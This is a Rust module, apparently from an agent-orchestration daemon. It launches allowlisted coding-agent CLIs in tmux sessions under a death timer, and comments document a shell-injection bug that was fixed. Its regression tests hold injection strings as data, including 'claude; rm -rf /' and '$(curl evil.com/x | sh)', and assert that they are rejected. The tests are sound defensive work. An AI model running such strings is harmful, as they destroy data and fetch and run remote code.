use anyhow::Result;
use std::sync::Arc;
use std::time::Duration;
use tokio::process::Command;
use tokio::sync::RwLock;
use uuid::Uuid;

use crate::daemon::state::DaemonState;

/// Resolves an agent identity to its `(program, args)` invocation — never a
/// shell. Mirrors `agent_runner::canonical_agent_identity`'s accepted input
/// forms so both handoff-delivery paths (the WS `Handover` command that
/// calls `spawn_agent` below, and `raios run`/`raios task` in
/// `agent_runner.rs`) treat the same identity string the same way.
///
/// Returns `None` for anything unrecognized instead of falling through to a
/// shell: the previous implementation ran `sh -lc <agent_name>` (Unix) /
/// `powershell -Command <agent_name>` (Windows) with `agent_name` taken
/// verbatim from the WS client's `target` field (`daemon/handlers.rs`'s
/// `"Handover"` command) — an unauthenticated-content shell injection, only
/// not live-exploitable today because `Handover` happens to default to
/// `action = "confirm"` in `raios-policy.toml` (see `security/umai.rs`),
/// which is a policy setting, not a code guarantee.
fn agent_command(agent_name: &str) -> Option<(&'static str, Vec<String>)> {
    match agent_name.trim().to_lowercase().as_str() {
        "claude" | "claude_kaira" => Some(("claude", vec![])),
        "codex" | "codex_kaira" => Some(("codex", vec![])),
        "opencode" | "opencode_kaira" => Some(("opencode", vec![])),
        "antigravity" | "agy" | "antigravity_kaira" => Some(("agy", vec![])),
        _ => None,
    }
}

/// One naming scheme for tmux sessions, defined once. Every steer/spawn/kill
/// call derives the session name this way — never re-formatted ad hoc.
pub(crate) fn tmux_session_name(id: Uuid) -> String {
    format!("raios-agent-{id}")
}

/// Representation of an active agent process.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentProcess {
    pub id: Uuid,
    pub name: String,
    pub status: String,
    pub started_at: std::time::SystemTime,
    pub logs: Vec<String>,
}

#[derive(Clone)]
pub struct ExecutionProxy {
    state: Arc<RwLock<DaemonState>>,
    event_tx: Option<tokio::sync::broadcast::Sender<String>>,
}

impl ExecutionProxy {
    pub fn new(state: Arc<RwLock<DaemonState>>) -> Self {
        Self {
            state,
            event_tx: None,
        }
    }

    pub fn with_event_tx(mut self, tx: tokio::sync::broadcast::Sender<String>) -> Self {
        self.event_tx = Some(tx);
        self
    }

    fn push_event(&self, event: serde_json::Value) {
        if let Some(tx) = &self.event_tx {
            let _ = tx.send(event.to_string());
        }
    }

    /// Spawns an agent in an isolated environment with a Death Timer.
    ///
    /// `agent_name` must resolve via `agent_command` to one of the four
    /// canonical agent identities — anything else is refused before any
    /// process state is touched. No ambient authority: an unrecognized
    /// identity is not a "best effort" shell invocation, it's an error.
    pub async fn spawn_agent(
        &self,
        agent_name: &str,
        project_path: &str,
        timeout_secs: u64,
    ) -> Result<String> {
        let (program, program_args) = agent_command(agent_name).ok_or_else(|| {
            anyhow::anyhow!(
                "Unknown agent identity '{}' — refusing to spawn",
                agent_name
            )
        })?;

        let process_id = Uuid::new_v4();

        // Register the process in state
        let agent_proc = AgentProcess {
            id: process_id,
            name: agent_name.to_string(),
            status: "Running".to_string(),
            started_at: std::time::SystemTime::now(),
            logs: Vec::new(),
        };

        {
            let mut state_lock = self.state.write().await;
            state_lock.active_agents.push(agent_proc.clone());
        }

        self.push_event(serde_json::json!({
            "event": "AgentStarted",
            "agent_id": process_id.to_string(),
            "name": agent_name,
            "project_path": project_path,
        }));

        let session_name = tmux_session_name(process_id);
        if let Err(e) = self
            .spawn_via_tmux(
                process_id,
                program,
                &program_args,
                project_path,
                timeout_secs,
            )
            .await
        {
            let mut state_lock = self.state.write().await;
            if let Some(agent) = state_lock
                .active_agents
                .iter_mut()
                .find(|a| a.id == process_id)
            {
                agent.status = "Failed to spawn process".to_string();
            }
            drop(state_lock);
            return Err(e);
        }
        println!(
            "[Proxy] Spawning agent '{}' (ID: {}) with {}s death timer via tmux session '{}'",
            agent_name, process_id, timeout_secs, session_name
        );

        Ok(process_id.to_string())
    }

    /// Launches `program` (with `args`) inside a detached tmux session named
    /// after `id`, polls for the pane's exit via tmux's own `remain-on-exit`
    /// and `pane_dead_status` (tmux keeps the dead pane around instead of
    /// auto-closing the session, so we can read the real exit code — a bare
    /// `tmux has-session` poll can't distinguish success from failure), and
    /// writes the resulting status into `DaemonState.active_agents` exactly
    /// like the pre-tmux `Command::spawn` path did. `timeout_secs` is the
    /// Death Timer: exceeding it kills the session and records
    /// `"Killed by Death Timer (Timeout)"`, unchanged from before.
    ///
    /// Does not touch `AgentProcess.logs` — see Task 3 for output capture.
    pub(crate) async fn spawn_via_tmux(
        &self,
        id: Uuid,
        program: &str,
        args: &[String],
        cwd: &str,
        timeout_secs: u64,
    ) -> Result<()> {
        let session = tmux_session_name(id);

        let mut new_session = Command::new("tmux");
        new_session
            .arg("new-session")
            .arg("-d")
            .arg("-s")
            .arg(&session)
            .arg("-c")
            .arg(cwd)
            .arg(program);
        for a in args {
            new_session.arg(a);
        }
        let status = new_session.status().await?;
        if !status.success() {
            return Err(anyhow::anyhow!(
                "tmux new-session failed for session '{}' (exit: {:?})",
                session,
                status.code()
            ));
        }

        // Keep the pane around after the command exits so we can read its
        // exit status instead of the session silently vanishing.
        Command::new("tmux")
            .args(["set-option", "-t", &session, "remain-on-exit", "on"])
            .status()
            .await?;

        let state = self.state.clone();
        let event_tx = self.event_tx.clone();
        let session_for_task = session.clone();

        tokio::spawn(async move {
            let poll_interval = Duration::from_millis(500);
            let max_polls = ((timeout_secs * 1000) / poll_interval.as_millis() as u64).max(1);
            let mut final_status = "Killed by Death Timer (Timeout)";

            for _ in 0..max_polls {
                tokio::time::sleep(poll_interval).await;

                let dead = Command::new("tmux")
                    .args([
                        "display-message",
                        "-p",
                        "-t",
                        &session_for_task,
                        "#{pane_dead}",
                    ])
                    .output()
                    .await
                    .ok()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "1")
                    .unwrap_or(false);

                if dead {
                    let exit_ok = Command::new("tmux")
                        .args([
                            "display-message",
                            "-p",
                            "-t",
                            &session_for_task,
                            "#{pane_dead_status}",
                        ])
                        .output()
                        .await
                        .ok()
                        .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "0")
                        .unwrap_or(false);
                    final_status = if exit_ok {
                        "Completed Successfully"
                    } else {
                        "Exited with Error"
                    };
                    break;
                }
            }

            // Either the pane died naturally (final_status set above) or the
            // Death Timer ran out (final_status still its default) — either
            // way, tear the session down. Killing an already-dead session's
            // remnants is a no-op tmux tolerates.
            let _ = Command::new("tmux")
                .args(["kill-session", "-t", &session_for_task])
                .status()
                .await;

            let mut state_lock = state.write().await;
            if let Some(agent) = state_lock.active_agents.iter_mut().find(|a| a.id == id) {
                agent.status = final_status.to_string();
            }
            drop(state_lock);

            if let Some(tx) = &event_tx {
                let _ = tx.send(
                    serde_json::json!({
                        "event": "AgentStopped",
                        "agent_id": id.to_string(),
                        "final_status": final_status,
                    })
                    .to_string(),
                );
            }
        });

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::{agent_command, tmux_session_name};

    #[test]
    fn tmux_session_name_uses_raios_agent_prefix_and_id() {
        let id = uuid::Uuid::new_v4();
        assert_eq!(tmux_session_name(id), format!("raios-agent-{id}"));
    }

    #[test]
    fn agent_command_resolves_all_canonical_identities() {
        assert_eq!(agent_command("claude"), Some(("claude", vec![])));
        assert_eq!(agent_command("claude_kaira"), Some(("claude", vec![])));
        assert_eq!(agent_command("codex"), Some(("codex", vec![])));
        assert_eq!(agent_command("codex_kaira"), Some(("codex", vec![])));
        assert_eq!(agent_command("opencode"), Some(("opencode", vec![])));
        assert_eq!(agent_command("opencode_kaira"), Some(("opencode", vec![])));
        assert_eq!(agent_command("antigravity"), Some(("agy", vec![])));
        assert_eq!(agent_command("agy"), Some(("agy", vec![])));
        assert_eq!(agent_command("antigravity_kaira"), Some(("agy", vec![])));
    }

    #[test]
    fn agent_command_is_case_and_whitespace_insensitive() {
        assert_eq!(agent_command("  Claude  "), Some(("claude", vec![])));
        assert_eq!(agent_command("CODEX"), Some(("codex", vec![])));
    }

    /// Regression test for the shell-injection bug this module used to have:
    /// `agent_name` is client-supplied (WS `Handover` command's `target`
    /// field) and used to be handed straight to `sh -lc`/`powershell
    /// -Command`. Anything that isn't a known agent identity — including a
    /// deliberately shell-metacharacter-laden string — must be refused, not
    /// passed to a shell "best effort".
    #[test]
    fn agent_command_rejects_unknown_or_injection_looking_input() {
        assert_eq!(agent_command("claude; rm -rf /"), None);
        assert_eq!(agent_command("$(curl evil.com/x | sh)"), None);
        assert_eq!(agent_command(""), None);
        assert_eq!(agent_command("gemini"), None); // removed CLI, see 2026-06-22 changelog
    }

    #[tokio::test]
    async fn spawn_agent_rejects_unknown_identity_before_touching_state() {
        use super::{DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());

        let result = proxy
            .spawn_agent("claude; touch /tmp/pwned", "/tmp", 5)
            .await;
        assert!(result.is_err());
        assert!(state.read().await.active_agents.is_empty());
    }

    #[tokio::test]
    async fn spawn_agent_via_tmux_reaches_completed_status() {
        use super::{AgentProcess, DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        // `agent_command("claude")` resolves to a real "claude" binary this test
        // environment doesn't control, so this test exercises the tmux/exit-status
        // plumbing directly by calling the new `spawn_via_tmux` helper (Step 3)
        // with an arbitrary harmless command instead of going through the
        // `agent_command()` allowlist — that allowlist itself is already covered
        // by `agent_command_resolves_all_canonical_identities` above.
        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // `spawn_via_tmux`'s contract only ever *finds and updates* an
        // existing `AgentProcess` entry — it does not register one itself.
        // The real `spawn_agent` caller registers this "Running" entry
        // before calling `spawn_via_tmux`; mirror that here since this test
        // calls `spawn_via_tmux` directly.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "true".to_string(),
                status: "Running".to_string(),
                started_at: std::time::SystemTime::now(),
                logs: Vec::new(),
            });
        }

        proxy
            .spawn_via_tmux(id, "true", &[], ".", 5)
            .await
            .expect("tmux spawn should succeed");

        // Poll up to 3s for the background task to observe pane exit and update state —
        // `true` exits immediately, well inside the 5s Death Timer.
        let mut status = String::new();
        for _ in 0..30 {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                status = agent.status.clone();
                if status != "Running" {
                    break;
                }
            }
        }
        assert_eq!(status, "Completed Successfully");
    }

    #[tokio::test]
    async fn spawn_agent_via_tmux_death_timer_kills_long_running_session() {
        use super::{AgentProcess, DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // See the matching comment in `spawn_agent_via_tmux_reaches_completed_status`
        // above — `spawn_via_tmux` only updates a pre-existing entry, it never
        // registers one, so this test registers it itself before calling in.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sleep".to_string(),
                status: "Running".to_string(),
                started_at: std::time::SystemTime::now(),
                logs: Vec::new(),
            });
        }

        proxy
            .spawn_via_tmux(id, "sleep", &["30".to_string()], ".", 1)
            .await
            .expect("tmux spawn should succeed");

        let mut status = String::new();
        for _ in 0..40 {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                status = agent.status.clone();
                if status != "Running" {
                    break;
                }
            }
        }
        assert_eq!(status, "Killed by Death Timer (Timeout)");
    }
}
